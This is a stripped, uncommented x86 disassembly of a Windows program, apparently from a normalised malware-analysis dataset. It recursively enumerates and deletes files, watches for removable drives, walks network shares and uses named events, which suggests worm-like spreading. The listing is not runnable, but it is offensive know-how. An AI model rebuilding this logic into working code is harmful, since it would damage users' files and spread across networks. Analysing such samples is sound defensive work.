call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x124 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_409cdd
add esp 0xc
lea eax [ ebp - 0x124 ]
push eax
lea eax [ ebp - 0x1150 ]
push eax
mov ecx edi
mov [ ebp + 0x10 ] bl
call sub_409790
test eax eax
jne r-xdata
push [ ebp + 0x74 ]
call [ FindClose@IAT ]
lea ecx [ esi + 0x204d ]
call sub_40abb6
cmp al bl
mov [ esi + 0x2589 ] al
je r-xdata
lea eax [ ebp - 0x1150 ]
push eax
call [ DeleteFileA@IAT ]
jmp r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
test al al
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x1150 ]
push eax
mov ecx esi
call sub_404853
cmp al bl
mov [ esi + 0x2589 ] al
je r-xdata
mov eax [ ebp - 0x130 ]
neg eax
push eax
mov ecx edi
call sub_4091f8
mov eax [ esi ]
mov ecx esi
call [ eax + 0x10 ]
test al al
jne r-xdata
lea ecx [ esi + 0x1e2b ]
call sub_40a5dc
push 0x3e8
call [ Sleep@IAT ]
sub_4030b8
push ebp
mov ebp esp
sub esp 0x100
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push [ ebp + 0xc ]
mov esi ecx
push ebx
call sub_40a406
test al al
pop ecx
pop ecx
je r-xdata
push [ ebp + 0xc ]
lea ecx [ esi + 0x204d ]
push ebx
call sub_40ad4c
push edi
push 0x3d
mov edi 0x100
push edi
lea eax [ ebp - 0x100 ]
push eax
push rw-data
call sub_402a88
pop ecx
push eax
push ebx
call sub_40a1d9
add esp 0x14
test al al
je r-xdata
push 0x3d
push edi
lea eax [ ebp - 0x100 ]
push eax
push rw-data
call sub_402a88
pop ecx
push eax
push ebx
call sub_40a1d9
add esp 0x14
test al al
pop edi
je r-xdata
lea eax [ ebp - 0x100 ]
push eax
call sub_40a0d0
pop ecx
mov [ esi + 0x220 ] eax
pop esi
mov al 0x1
pop ebx
leave
retn 0x8
push rw-data
call sub_402a88
push eax
lea eax [ ebp - 0x100 ]
push eax
call sub_409c95
add esp 0xc
test al al
je r-xdata
push rw-data
call sub_402a88
push eax
lea eax [ ebp - 0x100 ]
push eax
call sub_409c95
add esp 0xc
test al al
je r-xdata
mov [ esi + 0x258a ] 0x1
mov [ esi + 0x258a ] 0x1
mov [ esi + 0x2588 ] 0x1
jmp r-xdata
sub_4031a5
push ebp
mov ebp esp
sub esp 0x100
push esi
push edi
push 0x3d
mov esi 0x100
push esi
lea eax [ ebp - 0x100 ]
push eax
push rw-data
mov edi ecx
mov [ ebp - 0x100 ] 0x0
call sub_402a88
pop ecx
push eax
push [ ebp + 0x8 ]
call sub_40a1d9
add esp 0x14
test al al
jne r-xdata
cmp [ ebp - 0x100 ] 0x0
je r-xdata
xor al al
jmp r-xdata
lea eax [ ebp - 0x100 ]
push eax
call sub_409c76
inc eax
cmp eax esi
pop ecx
jbe r-xdata
pop edi
pop esi
leave
retn 0x4
push eax
lea eax [ ebp - 0x100 ]
push eax
lea esi [ edi - 0x1e23 ]
push esi
call sub_405366
add esp 0xc
push esi
lea ecx [ edi + 0x222 ]
call sub_40ab22
mov al 0x1
mov eax esi
sub_403236
cmp [ esp + 0x4 ] 0x0
mov eax ecx
je r-xdata
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov [ eax + ecx ] rw-data
mov ecx [ eax ]
mov ecx [ ecx + 0x8 ]
mov [ eax + ecx ] rw-data
retn 0x4
mov [ eax ] rw-data
mov [ eax + 0x11 ] rw-data
mov [ eax + 0x119 ] rw-data
sub_403271
push ebp
mov ebp esp
sub esp 0x114
mov eax [ rw-data ]
push esi
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
xor esi esi
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x114 ]
push eax
mov [ ebp - 0x114 ] 0x0
call [ lstrcpyA@IAT ]
cmp [ ebp - 0x114 ] 0x0
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] 0x3
mov [ ebp - 0xc ] eax
je r-xdata
xor eax eax
test esi esi
sete al
pop esi
leave
retn
push esi
push 0xc
lea eax [ ebp - 0x14 ]
push eax
push 0x26
call UrlMkSetSessionOption
mov esi eax
sub_403320
cmp [ esp + 0x4 ] 0x0
push esi
mov esi ecx
je r-xdata
mov [ esi + 0x8 ] rw-data
mov [ esi ] rw-data
mov [ esi + 0x8 ] rw-data
mov eax esi
pop esi
retn 0x4
lea ecx [ esi + 0x10 ]
mov [ esi + 0x4 ] rw-data
mov [ esi + 0xc ] rw-data
call sub_405f50
sub_40335a
push ebx
push esi
mov esi ecx
push edi
lea edi [ esi + 0x1e16 ]
mov ebx [ edi ]
push rw-data
call sub_402a88
pop ecx
push eax
mov ecx edi
call [ ebx ]
mov eax [ esi + 0x208 ]
mov eax [ eax + 0xc ]
lea eax [ eax + esi + 0x21c ]
push eax
push 0x1
push 0x1f0003
call [ OpenEventA@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
mov eax [ esi + 0x208 ]
mov eax [ eax + 0xc ]
lea eax [ eax + esi + 0x21c ]
push eax
push 0x0
push 0x1
push 0x0
call [ CreateEventA@IAT ]
mov ecx esi
mov edi eax
call sub_402ee2
push edi
call [ CloseHandle@IAT ]
sub_4033cc
push ebp
mov ebp esp
sub esp 0x80
push esi
mov esi ecx
push edi
lea ecx [ esi - 0x1e16 ]
call sub_403271
mov edi [ ebp + 0x8 ]
push edi
lea ecx [ esi + 0x775 ]
call sub_4063cd
push edi
lea ecx [ esi + 0x110 ]
call sub_404796
push edi
lea ecx [ esi + 0x347 ]
call sub_40a4f1
lea eax [ esi - 0x1e0e ]
push eax
lea ecx [ esi + 0x237 ]
call sub_40ab22
push 0x3d
push 0x80
lea eax [ ebp - 0x80 ]
push eax
push rw-data
call sub_402a88
pop ecx
push eax
push edi
call sub_40a1d9
add esp 0x14
test al al
je r-xdata
pop edi
pop esi
leave
retn 0x4
lea eax [ ebp - 0x80 ]
push eax
call sub_40a0d0
test eax eax
pop ecx
je r-xdata
mov [ esi + 0x76e ] eax
sub_40345b
cmp [ esp + 0x4 ] 0x0
push esi
push edi
mov esi ecx
je r-xdata
lea edi [ esi + 0x4 ]
push 0x0
mov ecx edi
call sub_403236
mov eax [ edi ]
mov [ esi ] rw-data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x4 ] rw-data
mov eax [ edi ]
mov eax [ eax + 0x8 ]
mov [ eax + esi + 0x4 ] rw-data
pop edi
mov eax esi
pop esi
retn 0x4
mov [ esi + 0x4 ] rw-data
mov [ esi + 0x15 ] rw-data
mov [ esi + 0x11d ] rw-data
sub_4034b1
push ebp
mov ebp esp
push ecx
push esi
push edi
xor edi edi
cmp [ ebp + 0x8 ] edi
mov esi ecx
mov [ ebp - 0x4 ] edi
je r-xdata
push edi
mov ecx esi
call sub_40b23e
lea edi [ esi + 0x219 ]
mov ecx edi
call sub_402c6f
mov [ esi ] rw-data
mov [ edi ] rw-data
lea eax [ esi + 0x208 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + esi + 0x208 ] rw-data
mov ecx [ eax ]
mov ecx [ ecx + 0x8 ]
mov [ ecx + esi + 0x208 ] rw-data
mov eax [ eax ]
mov eax [ eax + 0xc ]
mov [ eax + esi + 0x208 ] rw-data
pop edi
mov eax esi
pop esi
leave
retn 0x4
mov [ esi + 0x208 ] rw-data
mov [ esi + 0x4 ] rw-data
mov [ esi + 0x329 ] rw-data
lea ecx [ esi + 0x435 ]
mov [ esi + 0x431 ] rw-data
call sub_40a8fa
sub_403552
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
push esi
mov esi ecx
je r-xdata
push 0x0
mov ecx esi
call sub_40b2f7
mov eax [ esi + 0x208 ]
mov [ esi ] rw-data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x208 ] rw-data
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x8 ]
mov [ eax + esi + 0x208 ] rw-data
mov eax [ esi + 0x208 ]
mov eax [ eax + 0xc ]
mov [ eax + esi + 0x208 ] rw-data
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov [ eax + esi + 0x208 ] rw-data
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov [ eax + esi + 0x210 ] rw-data
mov [ esi + 0x242 ] 0x200
mov eax esi
pop esi
leave
retn 0x4
mov [ esi + 0x208 ] rw-data
mov [ esi + 0x4 ] rw-data
mov [ esi + 0x3ae ] rw-data
mov [ esi + 0x3b6 ] rw-data
mov [ esi + 0x246 ] rw-data
lea ecx [ esi + 0x352 ]
mov [ esi + 0x34e ] rw-data
call sub_40a8fa
lea ecx [ esi + 0x376 ]
call sub_405f50
push 0x0
lea ecx [ esi + 0x3aa ]
call sub_403320
sub_403643
push ebp
mov ebp esp
push ecx
push esi
push edi
xor edi edi
cmp [ ebp + 0x8 ] edi
mov esi ecx
mov [ ebp - 0x4 ] edi
je r-xdata
push edi
mov ecx esi
call sub_403552
lea edi [ esi + 0x246 ]
mov ecx edi
call sub_409899
mov eax [ esi + 0x208 ]
mov [ esi ] rw-data
mov [ edi ] rw-data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x208 ] rw-data
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x8 ]
mov [ eax + esi + 0x208 ] rw-data
mov eax [ esi + 0x208 ]
mov eax [ eax + 0xc ]
mov [ eax + esi + 0x208 ] rw-data
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov [ eax + esi + 0x208 ] rw-data
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov [ eax + esi + 0x210 ] rw-data
mov eax [ esi + 0x208 ]
mov eax [ eax + 0xc ]
lea ecx [ eax - 0x1d1e ]
mov [ eax + esi + 0x204 ] ecx
pop edi
mov eax esi
pop esi
leave
retn 0x4
mov [ esi + 0x208 ] rw-data
mov [ esi + 0x4 ] rw-data
mov [ esi + 0x1f82 ] rw-data
mov [ esi + 0x1f8a ] rw-data
mov [ esi + 0x1e16 ] rw-data
lea ecx [ esi + 0x1f26 ]
mov [ esi + 0x1f1e ] rw-data
call sub_40a8fa
lea ecx [ esi + 0x1f4a ]
call sub_405f50
push edi
lea ecx [ esi + 0x1f7e ]
call sub_403320
sub_403753
push ebp
mov ebp esp
push ecx
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] ebx
je r-xdata
push ebx
mov ecx esi
call sub_403643
lea edi [ esi + 0x1e16 ]
push ebx
mov ecx edi
call sub_40345b
lea ebx [ esi + 0x1e2b ]
push 0x0
mov ecx ebx
call sub_40a693
lea ecx [ esi + 0x204d ]
push 0x0
call sub_4034b1
lea eax [ esi + 0x2376 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov [ eax + ecx ] rw-data
lea eax [ esi + 0x2580 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov [ eax + ecx ] rw-data
mov eax [ esi + 0x208 ]
mov [ esi ] rw-data
mov [ esi + 0x246 ] rw-data
mov [ edi ] rw-data
mov [ ebx ] rw-data
mov [ esi + 0x204d ] rw-data
mov [ esi + 0x2266 ] rw-data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x208 ] rw-data
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x8 ]
mov [ eax + esi + 0x208 ] rw-data
mov eax [ esi + 0x208 ]
mov eax [ eax + 0xc ]
mov [ eax + esi + 0x208 ] rw-data
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov [ eax + esi + 0x208 ] rw-data
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov [ eax + esi + 0x210 ] rw-data
mov eax [ esi + 0x208 ]
mov eax [ eax + 0xc ]
lea ecx [ eax - 0x24a7 ]
mov [ eax + esi + 0x204 ] ecx
lea ecx [ esi + 0x258b ]
call sub_406211
pop edi
mov [ esi + 0x258a ] 0x0
mov [ esi + 0x2588 ] 0x0
mov [ esi + 0x2589 ] 0x1
mov [ esi + 0x2584 ] 0x258
mov eax esi
pop esi
pop ebx
leave
retn 0x4
mov [ esi + 0x208 ] rw-data
mov [ esi + 0x4 ] rw-data
mov [ esi + 0x1e1a ] rw-data
mov [ esi + 0x2033 ] rw-data
mov [ esi + 0x1e2f ] rw-data
mov [ esi + 0x2255 ] rw-data
mov [ esi + 0x2051 ] rw-data
mov [ esi + 0x2376 ] rw-data
mov [ esi + 0x2580 ] rw-data
mov [ esi + 0x270b ] rw-data
mov [ esi + 0x2713 ] rw-data
mov [ esi + 0x259f ] rw-data
lea ecx [ esi + 0x26af ]
mov [ esi + 0x26a7 ] rw-data
call sub_40a8fa
lea ecx [ esi + 0x26d3 ]
call sub_405f50
push ebx
lea ecx [ esi + 0x2707 ]
call sub_403320
sub_403980
push esi
push edi
mov esi ecx
call sub_409899
lea edi [ esi + 0x1b90 ]
mov ecx edi
call sub_404765
mov [ edi ] rw-data
pop edi
mov [ esi ] rw-data
mov eax esi
pop esi
retn
sub_4039ce
push ebx
push esi
mov esi [ esp + 0xc ]
mov edx [ esi ]
xor ecx ecx
inc ecx
xor al al
test edx edx
mov ebx edx
je r-xdata
pop esi
pop ebx
retn
test bl 0x1
jne r-xdata
not ecx
and ecx edx
mov [ esi ] ecx
add eax 0x41
shr ebx 0x1
add ecx ecx
inc al
cmp al 0x1a
jl r-xdata
sub_403a1b
push esi
push edi
mov esi ecx
call sub_404765
lea edi [ esi + 0x230 ]
mov ecx edi
call sub_40b553
and [ esi + 0x24c ] 0x0
mov [ edi ] rw-data
mov [ esi ] rw-data
mov edi rw-data
push 0x1dc0
call sub_405340
pop ecx
mov ecx eax
mov [ edi ] eax
call sub_403980
add edi 0x4
cmp edi rw-data
jl r-xdata
pop edi
mov eax esi
pop esi
retn
sub_403a98
push ebp
mov ebp esp
sub esp 0x1400
cmp [ ebp + 0xc ] 0x219
jne r-xdata
xor eax eax
inc eax
leave
retn 0x10
mov eax [ ebp + 0x10 ]
sub eax 0x8000
push ebx
push esi
push edi
je r-xdata
mov eax [ ebp + 0x14 ]
cmp [ eax + 0x4 ] 0x2
jne r-xdata
dec eax
je r-xdata
pop edi
pop esi
pop ebx
mov eax [ eax + 0xc ]
mov [ ebp + 0x14 ] eax
xor edi edi
mov esi 0x1b90
mov eax [ ebp + 0x14 ]
cmp [ eax + 0x4 ] 0x6
jne r-xdata
sub eax 0x3
jne r-xdata
cmp edi 0x4
jge r-xdata
inc edi
cmp edi 0x4
jl r-xdata
push [ eax + 0x10 ]
mov ebx [ eax + 0xc ]
call [ UnregisterDeviceNotification@IAT ]
mov edi rw-data
mov esi 0x1b90
mov eax [ ebp + 0x14 ]
cmp [ eax + 0x4 ] 0x2
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
call sub_4039ce
mov [ ebp - 0x1400 ] al
pop ecx
lea eax [ ebp - 0x1400 ]
push eax
mov [ ebp - 0x13ff ] 0x3a
mov [ ebp - 0x13fe ] 0x5c
mov [ ebp - 0x13fd ] 0x0
call [ GetDriveTypeA@IAT ]
cmp eax 0x2
je r-xdata
mov ecx [ edi * 4 + rw-data ]
add ecx esi
call sub_404339
test eax eax
je r-xdata
add edi 0x4
cmp edi rw-data
jl r-xdata
mov ecx [ edi ]
add ecx esi
call sub_404332
cmp eax ebx
jne r-xdata
mov eax [ eax + 0xc ]
mov [ ebp + 0x14 ] eax
lea eax [ ebp + 0x14 ]
push eax
call sub_4039ce
mov bl al
test bl bl
pop ecx
je r-xdata
lea edi [ edi * 4 + rw-data ]
mov ecx [ edi ]
lea eax [ ebp - 0x1400 ]
push eax
add ecx esi
call sub_403e3a
mov ecx [ edi ]
add ecx esi
call sub_404390
mov [ ebp + 0x14 ] eax
mov ebx 0x400
lea eax [ ebp - 0x400 ]
push ebx
push eax
call sub_405388
mov eax [ ebp + 0x14 ]
pop ecx
pop ecx
mov [ ebp - 0x3f4 ] eax
push 0x0
lea eax [ ebp - 0x400 ]
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x3fc ] 0x6
mov [ ebp - 0x400 ] ebx
call [ RegisterDeviceNotificationA@IAT ]
mov ecx [ edi ]
add ecx esi
call sub_40b454
cmp eax 0x3
jne r-xdata
mov ecx [ edi ]
add ecx esi
call sub_404339
test eax eax
je r-xdata
jmp r-xdata
mov ecx [ edi ]
add ecx esi
call sub_40b42a
mov ecx [ edi ]
add ecx esi
call sub_403db2
mov esi 0x1b90
add edi 0x4
cmp edi rw-data
jl r-xdata
mov ecx [ edi ]
lea eax [ ebp - 0x1400 ]
push eax
add ecx esi
call sub_403ea1
cmp [ ebp - 0x1400 ] bl
jne r-xdata
mov ecx [ edi ]
add ecx esi
call sub_404339
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
call sub_4039ce
mov bl al
test bl bl
pop ecx
jne r-xdata
mov ecx [ edi ]
add ecx esi
call sub_40b42a
mov ecx [ edi ]
add ecx esi
call sub_403db2
mov edi rw-data
jmp r-xdata
sub_403ca2
push ebx
push esi
mov esi ecx
push edi
lea edi [ esi + 0x230 ]
mov [ esi ] rw-data
mov [ edi ] rw-data
mov ebx rw-data
mov ecx [ ebx ]
call sub_4039b2
push [ ebx ]
call sub_405354
add ebx 0x4
cmp ebx rw-data
pop ecx
jl r-xdata
mov ecx edi
call sub_40b4e0
pop edi
mov ecx esi
pop esi
pop ebx
jmp sub_4043db
sub_403ce9
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
lea eax [ ebp - 0x44 ]
push 0x28
push eax
mov ebx ecx
call sub_405388
pop ecx
pop ecx
lea eax [ ebp - 0x44 ]
push eax
mov [ ebp - 0x20 ] rw-data
mov [ ebp - 0x40 ] sub_403a98
call [ RegisterClassA@IAT ]
xor esi esi
push esi
push esi
push esi
push esi
push esi
push esi
push esi
push esi
push esi
push esi
push rw-data
call sub_402a88
pop ecx
push eax
push esi
call [ CreateWindowExA@IAT ]
mov edi [ GetMessageA@IAT ]
push esi
push esi
mov [ ebx + 0x24c ] eax
push esi
lea eax [ ebp - 0x1c ]
push eax
call edi
test eax eax
je r-xdata
mov esi rw-data
add ebx 0x230
mov ecx [ esi ]
add ecx 0x1b90
call sub_40b42a
add esi 0x4
cmp esi rw-data
jl r-xdata
pop edi
pop esi
xor eax eax
pop ebx
leave
retn
lea eax [ ebp - 0x1c ]
push eax
call [ TranslateMessage@IAT ]
lea eax [ ebp - 0x1c ]
push eax
call [ DispatchMessageA@IAT ]
push esi
push esi
push esi
lea eax [ ebp - 0x1c ]
push eax
call edi
test eax eax
jne r-xdata
mov ecx ebx
call sub_40b443
test eax eax
jne r-xdata
sub_403dd6
push ebx
push esi
push edi
push 0x1008
mov edi ecx
call sub_405340
push [ esp + 0x14 ]
mov esi eax
mov eax [ edi ]
mov [ esi ] eax
call sub_409c76
dec eax
cmp eax 0x1000
pop ecx
pop ecx
jae r-xdata
mov ebx 0xfff
push [ esp + 0x10 ]
call sub_409c76
pop ecx
mov ebx eax
jmp r-xdata
push ebx
push [ esp + 0x14 ]
lea eax [ esi + 0x4 ]
push eax
call sub_405366
movzx eax [ esp + 0x20 ]
mov [ ebx + esi + 0x4 ] 0x0
add esp 0xc
mov [ esi + 0x1004 ] eax
mov [ edi ] esi
pop edi
pop esi
pop ebx
retn 0x8
sub_403e4b
push ebx
push ebp
push esi
push edi
push 0x104
mov edi ecx
call sub_405340
mov ebp [ esp + 0x18 ]
mov esi eax
mov eax [ edi ]
push ebp
mov [ esi ] eax
call sub_409c76
dec eax
cmp eax 0x100
pop ecx
pop ecx
jae r-xdata
mov ebx 0xff
push ebp
call sub_409c76
pop ecx
mov ebx eax
jmp r-xdata
push ebx
lea eax [ esi + 0x4 ]
push ebp
push eax
call sub_405366
add esp 0xc
mov [ ebx + esi + 0x4 ] 0x0
mov [ edi ] esi
pop edi
pop esi
pop ebp
pop ebx
retn 0x4
sub_403eb8
push ebp
lea ebp [ esp - 0x6c ]
sub esp 0x2240
push esi
push edi
push [ ebp + 0x74 ]
mov esi ecx
call sub_409c76
push [ ebp + 0x78 ]
mov edi eax
call sub_409c76
lea eax [ edi + eax + 0x2 ]
cmp eax 0x1000
pop ecx
pop ecx
jg r-xdata
pop edi
pop esi
add ebp 0x6c
leave
retn 0xc
push ebx
push 0x0
push [ ebp + 0x74 ]
lea eax [ ebp - 0x1d4 ]
push eax
call sub_409cdd
lea eax [ ebp - 0x1d4 ]
push eax
call sub_40a052
push [ ebp + 0x78 ]
lea eax [ ebp - 0x1d4 ]
push eax
call sub_409cb9
mov edi [ FindFirstFileA@IAT ]
add esp 0x18
lea eax [ ebp - 0xd4 ]
push eax
lea eax [ ebp - 0x1d4 ]
push eax
call edi
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
xor ebx ebx
cmp [ ebp + 0x7c ] ebx
jne r-xdata
mov ecx esi
call sub_40b443
test eax eax
jne r-xdata
pop ebx
push ebx
push [ ebp + 0x74 ]
lea eax [ ebp - 0x1d4 ]
push eax
call sub_409cdd
lea eax [ ebp - 0x1d4 ]
push eax
call sub_40a052
lea eax [ ebp - 0x1d4 ]
push rw-data
push eax
call sub_409cb9
add esp 0x18
lea eax [ ebp - 0xd4 ]
push eax
lea eax [ ebp - 0x1d4 ]
push eax
call edi
cmp eax 0xffffffff
mov [ ebp + 0x7c ] eax
je r-xdata
push ebx
call [ FindClose@IAT ]
push 0xffffffff
push 0xa
push 0x64
push 0x1e
call sub_4048de
add esp 0xc
push eax
mov ecx esi
call sub_40b3ed
test [ ebp - 0xd4 ] 0x10
jne r-xdata
test [ ebp - 0xd4 ] 0x10
je r-xdata
lea eax [ ebp - 0xd4 ]
push eax
push ebx
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
mov eax [ esi ]
lea ecx [ ebp - 0xd4 ]
push ecx
mov ecx esi
call [ eax + 0x8 ]
test eax eax
push 0x0
je r-xdata
lea eax [ ebp - 0xd4 ]
push eax
push [ ebp + 0x7c ]
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
mov ecx esi
call sub_40b443
test eax eax
jne r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xc ]
test eax eax
jne r-xdata
push [ ebp + 0x74 ]
lea eax [ ebp - 0x11d4 ]
push eax
call sub_409cdd
lea eax [ ebp - 0x11d4 ]
push eax
call sub_40a052
lea eax [ ebp - 0xa8 ]
push eax
lea eax [ ebp - 0x11d4 ]
push eax
call sub_409cb9
mov eax [ esi ]
add esp 0x18
lea ecx [ ebp - 0x11d4 ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
jmp r-xdata
push [ ebp + 0x7c ]
call [ FindClose@IAT ]
push 0xffffffff
push 0xa
push 0x64
push 0x1e
call sub_4048de
add esp 0xc
push eax
mov ecx esi
call sub_40b3ed
lea eax [ ebp - 0xa8 ]
push rw-data
push eax
call sub_409c95
test al al
pop ecx
pop ecx
jne r-xdata
push eax
push [ ebp + 0x74 ]
lea eax [ ebp - 0x11d4 ]
push eax
call sub_409cdd
lea eax [ ebp - 0x11d4 ]
push eax
call sub_40a052
lea eax [ ebp - 0xa8 ]
push eax
lea eax [ ebp - 0x11d4 ]
push eax
call sub_409cb9
mov eax [ esi ]
add esp 0x18
lea ecx [ ebp - 0x11d4 ]
push ecx
mov ecx esi
call [ eax + 0x4 ]
test eax eax
je r-xdata
lea eax [ ebp - 0xa8 ]
push rw-data
push eax
call sub_409c95
test al al
pop ecx
pop ecx
jne r-xdata
push 0xffffffff
push 0x5
mov ecx esi
call sub_40b3ed
mov eax [ esi ]
lea ecx [ ebp - 0x11d4 ]
push ecx
mov ecx esi
call [ eax + 0x10 ]
lea eax [ esi + 0x24 ]
push eax
call sub_409c76
push [ ebp + 0x78 ]
mov edi eax
call sub_409c76
lea eax [ edi + eax + 0x2 ]
cmp eax 0x1000
pop ecx
pop ecx
jg r-xdata
mov eax [ esi ]
push ebx
mov ecx esi
call [ eax + 0xc ]
test eax eax
jne r-xdata
push ebx
push [ ebp + 0x74 ]
lea eax [ ebp - 0x21d4 ]
push eax
call sub_409cdd
lea eax [ ebp - 0x21d4 ]
push eax
call sub_40a052
lea eax [ ebp - 0xa8 ]
push eax
lea eax [ ebp - 0x21d4 ]
push eax
call sub_409cb9
add esp 0x18
push ebx
push [ ebp + 0x78 ]
lea eax [ ebp - 0x21d4 ]
push eax
mov ecx esi
call sub_403eb8
sub_4041a1
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
jmp r-xdata
call sub_40b443
test eax eax
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x14 ]
push 0xffffffff
push [ esi + 0x20 ]
mov ecx esi
mov [ ebp - 0x4 ] eax
call sub_40b3ed
mov ecx esi
mov eax [ ebp - 0x4 ]
pop esi
leave
retn
sub_4041d1
push esi
push edi
mov edi ecx
mov esi [ edi ]
test esi esi
je r-xdata
pop edi
pop esi
retn
mov eax [ esi ]
push esi
mov [ edi ] eax
call sub_405354
pop ecx
jmp r-xdata
sub_4041eb
push ebp
mov ebp esp
sub esp 0x2000
push esi
push 0x3d
push 0x2000
lea eax [ ebp - 0x2000 ]
push eax
push rw-data
mov esi ecx
call sub_402a88
pop ecx
push eax
push [ ebp + 0x8 ]
call sub_40a1d9
add esp 0x14
test al al
je r-xdata
pop esi
leave
retn 0x4
lea eax [ ebp - 0x2000 ]
push eax
call sub_40a0d0
imul eax eax 0x3e8
pop ecx
mov [ esi + 0x20 ] eax
sub_40423b
push esi
push edi
mov edi ecx
mov esi [ edi + 0x1c ]
test esi esi
je r-xdata
pop edi
xor eax eax
pop esi
retn
push ebx
pop ebx
lea eax [ esi + 0x4 ]
push eax
lea ebx [ edi + 0x124 ]
push ebx
call [ lstrcpyA@IAT ]
push 0x0
push ebx
lea eax [ edi + 0x24 ]
push eax
mov ecx edi
call sub_403eb8
mov esi [ esi ]
test esi esi
jne r-xdata
mov ecx edi
call sub_40b443
test eax eax
jne r-xdata
sub_40429b
push ebp
mov ebp esp
sub esp 0x8008
push ebx
push esi
push edi
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
mov edi ecx
push 0x0
push 0x0
push 0x2
call WNetOpenEnumA
push [ ebp - 0x4 ]
call WNetCloseEnum
pop edi
pop esi
pop ebx
leave
retn 0x4
cmp [ ebp + 0x8 ] ebx
jbe r-xdata
or [ ebp + 0x8 ] 0xffffffff
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x8008 ]
push eax
lea eax [ ebp + 0x8 ]
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0x8 ] 0x8000
call WNetEnumResourceA
xor ebx ebx
cmp eax ebx
jne r-xdata
lea esi [ ebp - 0x7ff4 ]
inc ebx
add esi 0x20
cmp ebx [ ebp + 0x8 ]
jb r-xdata
push eax
mov ecx edi
call sub_403e3a
mov ecx edi
call sub_40423b
lea eax [ esi - 0x14 ]
push eax
mov ecx edi
call sub_40429b
mov eax [ esi ]
test eax eax
je r-xdata
jmp r-xdata
sub_40434d
push ebp
mov ebp esp
sub esp 0x100
push esi
mov esi [ ebp + 0x8 ]
push edi
lea edi [ ecx + 0x1c ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x2c
push esi
call sub_40a2ee
mov esi eax
add esp 0x10
lea eax [ ebp - 0x100 ]
push eax
mov ecx edi
call sub_403e4b
cmp [ esi ] 0x0
jne r-xdata
pop edi
pop esi
leave
retn 0x4
sub_404390
push ebp
mov ebp esp
sub esp 0x100
push esi
mov esi ecx
push [ esi + 0x22c ]
call [ SetEvent@IAT ]
lea eax [ ebp - 0x100 ]
push eax
mov ecx esi
call sub_403ea1
push 0x0
push 0x2000000
push 0x3
push 0x0
push 0x5
push 0x1
lea eax [ ebp - 0x100 ]
push eax
call [ CreateFileA@IAT ]
mov [ esi + 0x228 ] eax
pop esi
leave
retn
sub_4043f8
push ebp
mov ebp esp
sub esp 0x2000
push esi
push 0x3d
push 0x2000
lea eax [ ebp - 0x2000 ]
push eax
push rw-data
mov esi ecx
call sub_402a88
pop ecx
push eax
push [ ebp + 0x8 ]
call sub_40a1d9
add esp 0x14
test al al
je r-xdata
push [ ebp + 0x8 ]
mov ecx esi
call sub_4041eb
pop esi
leave
retn 0x4
lea eax [ ebp - 0x2000 ]
push eax
mov ecx esi
call sub_40434d
sub_40444a
push ebp
mov ebp esp
sub esp 0x20010
mov eax [ rw-data ]
push esi
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
push edi
mov edi ecx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x1 ] 0x30
mov esi 0x20000
inc [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x39
jle r-xdata
lea eax [ ebp - 0x20010 ]
push eax
call sub_409c76
dec al
movsx eax al
lea eax [ ebp + eax - 0x20010 ]
cmp [ eax ] 0x3b
pop ecx
sete [ ebp - 0x5 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
push 0x3d
mov [ ebp - 0xa ] al
push esi
lea eax [ ebp - 0x20010 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x20010 ] 0x0
call sub_40a1d9
add esp 0x14
cmp [ ebp - 0x20010 ] 0x0
je r-xdata
push 0x3d
push esi
lea eax [ ebp - 0x20010 ]
push eax
push rw-data
